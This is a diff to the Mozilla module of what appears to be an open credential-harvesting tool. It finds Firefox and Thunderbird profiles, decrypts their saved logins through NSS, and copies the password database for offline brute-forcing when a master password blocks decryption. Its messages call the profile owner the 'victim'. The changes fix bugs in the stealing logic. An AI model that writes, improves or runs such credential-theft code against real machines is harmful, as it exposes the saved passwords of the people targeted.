@@ -27,8 +27,13 @@ class Credentials(object):
 		global database_find
 		self.db = db
 		if os.path.isfile(db):
-			database_find = True
-	
+			# check if the database is not empty
+			f = open(db, 'r')
+			tmp = f.read()
+			if tmp:
+				database_find = True
+			f.close()
+			
 	def __iter__(self):
 		pass
 	def done(self):
@@ -117,7 +122,7 @@ class Mozilla(ModuleInfo):
 			if software_name == 'Firefox':
 				path =  '%s\Mozilla\Firefox' % str(os.environ['APPDATA'])
 			elif software_name == 'Thunderbird':
-				path = '%s%s\Thunderbird' % (os.environ['APPDATA'], os.environ.get('HOMEPATH' ))
+				path = '%s\Thunderbird' % str(os.environ['APPDATA'])
 		else:
 			print_debug('The APPDATA environment variable is not definded.\nUse the -s option and specify the folder path of the victim\nPath: <HOMEPATH>\Application Data\Mozilla\Firefox\Profiles\<PROFILE_NAME>')
 			return 
@@ -378,30 +383,32 @@ class Mozilla(ModuleInfo):
 				
 				if self.initialize_libnss(list_libnss, profile):
 					masterPwd = self.is_masterpasswd_set()
-					if masterPwd:
-						print_debug('WARNING', 'A masterpassword is used !!')
-						masterPwdFound = self.found_masterpassword()
 					
-					if not masterPwd or masterPwdFound:
-						# check if passwors are stored on the Json format
-						credentials = JsonDatabase(profile)
-						if not database_find:
-							# check if passwors are stored on the sqlite format
-							credentials = SqliteDatabase(profile)
+					# check if passwors are stored on the Json format
+					credentials = JsonDatabase(profile)
+					if not database_find:
+						# check if passwors are stored on the sqlite format
+						credentials = SqliteDatabase(profile)
+					
+					# if not database_find:
+						# print_debug('INFO', 'No credentials file found (logins.json or signons.sqlite) - or empty content')
+					if database_find:
+						print 
+						if masterPwd:
+							print_debug('WARNING', 'A masterpassword is used !!')
+							masterPwdFound = self.found_masterpassword()
 						
-						if not database_find:
-							print_debug('INFO', 'No credentials file found (logins.json or signons.sqlite) - or empty content')
-						
-						try:
-							# decrypt passwords on the db
-							pwdFound+=self.decrypt(software_name, credentials)
-						except:
-							pass
+						if not masterPwd or masterPwdFound:
+							try:
+								# decrypt passwords on the db
+								pwdFound+=self.decrypt(software_name, credentials)
+							except:
+								pass
 
-					# if a master password is set (but not found), we save the db to bruteforce offline
-					elif masterPwd and not masterPwdFound and constant.output == 'txt':
-						self.save_db(profile)
-						
+						# if a master password is set (but not found), we save the db to bruteforce offline
+						elif masterPwd and not masterPwdFound and constant.output == 'txt':
+							self.save_db(profile)
+							
 					self.libnss.NSS_Shutdown()
 				
 				else:
